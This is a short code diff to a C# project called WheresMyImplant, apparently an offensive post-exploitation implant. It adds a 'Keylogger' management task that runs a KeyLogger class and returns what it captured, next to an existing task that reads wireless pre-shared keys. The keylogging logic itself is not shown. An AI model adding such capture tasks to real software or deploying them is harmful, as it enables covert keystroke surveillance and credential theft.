@@ -153,6 +153,23 @@ namespace WheresMyImplant
         }
 
         [ManagementTask]
+        public static String Keylogger()
+        {
+            StringBuilder output = new StringBuilder();
+            try
+            {
+                KeyLogger clipboard = new KeyLogger();
+                clipboard.Execute();
+                output.Append(clipboard.GetOutput());
+            }
+            catch (Exception ex)
+            {
+                output.Append(ex.ToString());
+            }
+            return output.ToString();
+        }
+
+        [ManagementTask]
         public static String WirelessPreSharedKey()
         {
             StringBuilder output = new StringBuilder();
